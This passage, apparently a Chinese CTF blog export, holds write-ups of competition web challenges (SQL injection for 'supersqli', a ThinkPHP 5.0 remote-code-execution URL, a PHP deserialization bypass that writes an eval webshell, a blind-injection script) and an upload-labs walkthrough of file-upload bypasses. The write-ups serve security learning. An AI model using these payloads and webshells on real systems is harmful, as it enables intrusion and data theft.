information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot; # exp = &quot;select flag from `1919810931114514`&quot; res = &#39;&#39; for i in exp: res += &quot;char(%s),&quot;%(ord(i)) my_payload = payload%(res[:-1]) print my_payload getflag 0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a; 方法三过滤的内容为： return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;, $inject); 发现这里面没有过滤一些show,alter等一些字段，我们可以通过修改表名，和表的字段名，来进行换表，得到flag。 首先通过报错注入查看库名： 1&#39;and extractvalue(1, concat(0x7e, (database()),0x7e)) 库名为：supersqli 查表名 chuddy&#39;; show tables; 返回结果为： array(1) { [0]=&gt; string(16) &quot;1919810931114514&quot; } array(1) { [0]=&gt; string(5) &quot;words&quot; } 查表结构： 1&#39;;show create table words;show create table `1919810931114514`; 表结构为： array(2) { [0]=&gt; string(5) &quot;words&quot; [1]=&gt; string(114) &quot;CREATE TABLE `words` ( `id` int(10) NOT NULL, `data` varchar(20) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot; } array(2) { [0]=&gt; string(16) &quot;1919810931114514&quot; [1]=&gt; string(101) &quot;CREATE TABLE `1919810931114514` ( `flag` varchar(100) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot; } 我们可以将words表改名为aaa,将flag所在的表改名为word。 注意，word表的查询时查的id，我们还需要给flag添加一个字段名。来保证查询语句中的id可以查询。 最终payload为： 1&#39;;alter table `1919810931114514` add(id int default 1);alter table words rename aaa;alter table `1919810931114514` rename words;# 然后查询1就可以得到flag了。 强网先锋-上单打开可以发现列目录。点击进去发现像是ThinkPHP. 打开Readme. 发现ThinkPHP 5.0。随手百度一下框架漏洞，发现存在命令执行，直接上payload /1/public/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag 就能得到flag。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"ciscn华中线下部分web题解","slug":"ciscn华中线下部分web题解","date":"2019-06-04T13:31:56.000Z","updated":"2019-06-05T08:51:21.804Z","comments":true,"path":"2019/06/04/ciscn华中线下部分web题解/","link":"","permalink":"http://yoursite.com/2019/06/04/ciscn华中线下部分web题解/","excerpt":"前言被队友带飞，躺进了国赛的分区赛，去了武汉，华中科技大学是真的大","text":"前言被队友带飞，躺进了国赛的分区赛，去了武汉，华中科技大学是真的大 web1打开题目，发现是一个代码审计题目 &lt;?php // ini_set(&quot;display_errors&quot;, &quot;On&quot;); // error_reporting(E_ALL | E_STRICT); class BlogLog { public $log_ = &#39;/tmp/web_log&#39;; public $content = &#39;[access] %s&#39;; public function __construct($data=null) { $temp = $this-&gt;init($data); $this-&gt;render($temp); } public function init($data) { // No, you can&#39;t control an object anymore! $format = &#39;/O:\\d:/&#39;; $flag = true; $flag = $flag &amp;&amp; substr($data, 0, 2) !== &#39;O:&#39;; $flag = $flag &amp;&amp; (!preg_match($format, $data)); if ($flag){ return unserialize($data); } return []; } public function createLog($filename=null, $content=null) { if ($this-&gt;log_ != null) $filename = $this-&gt;log_; if ($this-&gt;content != null) $content = $this-&gt;content; file_put_contents($filename, $content); } public function render($k) { echo sprintf($this-&gt;content, $k[&#39;name&#39;]); } public function __destruct() { $this-&gt;createLog(); } } $data = &quot;&quot;; if (isset($_GET[&#39;data&#39;])){ $data = $_GET[&#39;data&#39;]; new BlogLog($data); } else highlight_file(__FILE__); 通过分析源码，可以看出这是个反序列化的题目 发现init存在反序列化，__destruct中会调用createLog方法，createLog方法中有file_put_contents函数，会将$content的内容写入名为$filename的文件。 其中存在着一些过滤： substr($data, 0, 2) !== &#39;O:&#39;;会判断传递的参数的前两位是不是:O: (!preg_match($format, $data));利用正则进行判断传递的数据中是否含有/O:\\d:/ 过滤1，我们可以通过数组来进行绕过 过滤2，我们可以通过采取在代表对象长度的前面添加+号来绕过。 这样就可以写入webshell。 构造如下： &lt;?php class BlogLog { public $log_ = &#39;./chuddy.php&#39;; public $content = &#39;&lt;?php @eval($_POST[\\&#39;chuddy\\&#39;]); ?&gt;&#39;; } $a = new BlogLog(); echo serialize($a).&quot;&lt;br&gt;&quot;; $a = array(&#39;a&#39; =&gt;&#39;chuddy&#39;, $a); $b = serialize($a); echo $b; ?&gt; payload: a%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22chuddy%22%3Bi%3A0%3BO%3A%2b7%3A%22BlogLog%22%3A2%3A%7Bs%3A4%3A%22log_%22%3Bs%3A12%3A%22.%2fchuddy.php%22%3Bs%3A7%3A%22content%22%3Bs%3A33%3A%22%3C%3Fphp%20@eval%28%24_POST%5B%27chuddy%27%5D%29%3B%20%3F%3E%22%3B%7D%7D 访问./chuddy.php，里面写上了一句话木马，密码为chuddy直接连接蚁剑得到flag web2这也是一道代码审计的题目： &lt;?php include &quot;secret.php&quot;; error_reporting(0); if(empty($_GET)) { highlight_file(__FILE__); die(&quot;get get get get args&quot;); } $a1=$_GET[&#39;a1&#39;]; $a2=$_GET[&#39;a2&#39;]; $a3=$_GET[&#39;a3&#39;]; $a4=$_GET[&#39;a4&#39;]; $obstacle_1=is_numeric($a2) and is_numeric($a1); if(!$obstacle_1) exit(&quot;foolish&quot;); if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;); if(isset($a1)) { $secret=hash_hmac(&#39;sha256&#39;,$a1,$secret); } $hmac=hash_hmac(sha256,$a2,$secret); if($a3!==$hmac) { die(&quot;OMG&quot;); } echo &quot;gogogo &quot;.$url; ?&gt; get get get get args 代码审计一下，发现： 利用get传递四个参数，分别为a1,a2,a3,a4。 其中$obstacle_1=is_numeric($a2) and is_numeric($a1);a1,a2必须为数字，也可以通过 a1[]=3绕过 对a2的限制：if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;); 可以通过16进制或者科学记数法进行绕过 a3必须等于hash_hmac(sha256,$a2,$secret); 通过查阅资料发现hash_hmac()函数，如果加密的是一个数组则会返回false if(isset($a1)) { $secret=hash_hmac(&#39;sha256&#39;,$a1,$secret); } 通过控制a1的值，我们可以让$secret为空，那么$hmac就可以控制了。 首先本地测试一下，计算出我们需要的a3值： &lt;?php // include &quot;secret.php&quot;; error_reporting(0); $secret=&quot;chuddyaaa&quot;; $url=&quot;aaa&quot;; if(empty($_GET)) { highlight_file(__FILE__); die(&quot;get get get get args&quot;); } $a1=$_GET[&#39;a1&#39;]; $a2=$_GET[&#39;a2&#39;]; $a3=$_GET[&#39;a3&#39;]; $a4=$_GET[&#39;a4&#39;]; $obstacle_1=is_numeric($a2) and is_numeric($a1); if(!$obstacle_1) exit(&quot;foolish&quot;); if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;); if(isset($a1)) { $secret=hash_hmac(&#39;sha256&#39;,$a1,$secret); } $hmac=hash_hmac(sha256,$a2,$secret); echo $hmac.&quot;&lt;br&gt;&quot;; if($a3!==$hmac) { die(&quot;OMG&quot;); } echo &quot;gogogo &quot;.$url; ?&gt; a3为：ccb3fd8a1db86958d3b3551964d5948dd90d002e8bc80077e951fbbeec9de120 payload: ?a1[]=1&amp;a2=1e9&amp;a3=ccb3fd8a1db86958d3b3551964d5948dd90d002e8bc80077e951fbbeec9de120 得到文件名： gogogo xinqingfuza2019qwieasjkdnzx.php 访问该文件名： 看到这个页面就猜测是，sql注入。 当输入123正常返回查询:123，但是如果传递参数123&#39;返回数据库操作异常 我们可以通过这个返回差异进行盲注。 测试发现一些敏感字符被替换成为了QAQ 过滤了if,or,and,|关键的字符串。 发现可以盲注，但是因为过滤了or 不能使用information_schema这个表来爆出表名，所以只能尝试猜表名。 比赛的时候就是没猜出来，表名没做出来题目，难受。 猜出表名之后可以无列明注入，来注出表的内容。 脚本如下： #coding=utf-8 import requests url = &quot;http://127.0.0.1/daxuesheng/web5/xinqingfuza2019qwieasjkdnzx.php&quot; flag = &quot;&quot; for j in range(40): for i in range(32,128): # pay = &quot;admin&#39; union select 1,2,cot(1 &amp;&amp; left(database(),&quot;+str(j+1)+&quot;)=binary(&#39;&quot;+flag+chr(i)+&quot;&#39;))&#39;#&quot; #库名：ciscn pay = &quot;admin&#39; union select 1,2,cot(1 &amp;&amp; left(((select group_concat(`3`) from (select 1,2,3 union select * from article)b)),&quot;+str(j+1)+&quot;)=binary(&#39;&quot;+flag+chr(i)+&quot;&#39;))&#39;#&quot; date = {&#39;usr&#39;:pay} res = requests.request(method=&#39;post&#39;, url=url,data=date) # print pay # print res.content # print i # exit() if &quot;数据库操作异常&quot; not in res.content: flag += chr(i); print flag break 总结这次线下赛，真的是神仙打架，大佬们疯狂得分，也意识到自己还有很多需要学习的地方，加油","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"文件上传靶场练习","slug":"文件上传靶场练习","date":"2019-05-28T12:21:57.000Z","updated":"2019-06-04T13:14:12.864Z","comments":true,"path":"2019/05/28/文件上传靶场练习/","link":"","permalink":"http://yoursite.com/2019/05/28/文件上传靶场练习/","excerpt":"文件上传漏洞前言文件上传漏洞是一个高危漏洞，想要复习一下，二刷一下文件上传靶场","text":"文件上传漏洞前言文件上传漏洞是一个高危漏洞，想要复习一下，二刷一下文件上传靶场 Pass-01提示： 本pass在客户端使用js对不合法图片进行检查！ 通过提示发现是在客户端用js进行验证的，js验证实在发送到服务器端之前而验证的，那么我们就可以在此之前做点手脚。 可以先上传一个合法的文件，通过抓包来进行修改参数，就可以绕过这个限制了。 Pass-02提示 本pass在服务端对数据包的MIME进行检查！ 源码为： $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload = true; } } else { $msg = &#39;文件类型不正确，请重新上传！&#39;; } } else { $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;; } } 在http数据包中，判断文件类型的是Content-Type字段的值 同样抓包，修改Content-Type为image/jpeg 就可以绕过判断 Pass-03提示： 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！ 通过提示可以看出，应该是不完善的黑名单所导致的漏洞。 使用不存在于黑名单但是可执行的后缀即可 常见的可执行文件的后缀： PHP: php2、php3、php5、phtml、pht ASP: aspx、ascx、ashx、cer、asa JSP: jspx 注意：想要让服务器将你的文件解析为php，还需要将要修改httpd.conf：（把前面的#去掉） AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .php2 Pass-04提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload = true; } } else { $msg = &#39;此文件不允许上传!&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这个黑名单就比较完善了，过滤了各种罕见后缀，但是没有过滤.htaccess 我们在.htaccess文件上写： SetHandler application/x-httpd-php 意思就是把本目录下的jpeg文件当做php来解析 新建一个jpg文件，内容如下： &lt;?php @eval($_GET[&#39;chuddy&#39;]); ?&gt; 然后访问上传文件的存储位置，可以发现能够被解析为php文件。 Pass-05$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这个黑名单比前面的关卡更加完善了。过滤了.htaccess，但是代码中后缀转换为小写被去掉了，因此我们可以上传Php来绕过黑名单后缀。(在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写) Pass-06查看提示发现同样是黑名店限制，几乎涵盖了所有危险的后缀，那么查看源码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } win下的小技巧：Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php空格文件即可绕过。 Pass-07$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 此处会删除末尾的空格，但是没有去掉末尾的点，因此上传一个.php.文件即可绕过。 Pass-08$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 发现缺少::$DATA 查阅资料发现，这是利用windows操作系统的一个特性： NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。上传.php::$DATA绕过。(仅限windows) Pass-09is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 通过阅读源码，我们可以发现,用户上传的文件名，我们可控。且会删除文件名末尾的点和空格 结合上面几关的解题经验，我们可以发现可以通过创建文件.php.空格.来进行绕过 Pass-10$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $file_name)) { $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; $is_upload = true; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 通过查看源码发现 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 将黑名单的文件名替换成空，所以我们想到可以通过双写来进行绕过。 Pass-11$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &#39;上传失败！&#39;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 影响版本：5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7exp：move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\\x00.jpg&quot;); 源码中move_uploaded_file中的save_path可控，因此00截断即可。 Pass-12方法同上，只是请求方式改为POST Pass-13提示 本pass检查图标内容开头2个字节！ 我们可以伪造一下文件头的信息 常用文件头： （1） .JPEG;.JPE;.JPG，”JPGGraphic File” （2） .gif，”GIF 89A” （3） .zip，”Zip Compressed” （4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” Pass-14本关可以通过制作图片马进行绕过 制作图片马的方法： 在Windows的cmd中执行命令： copy 图片名/b+ 木马文件/a 合成的图片马名 Pass-15同14关 Pass-16主要是二次渲染绕过 jpg和png很麻烦，gif只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以了。 二次渲染的详解 Pass-17$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; 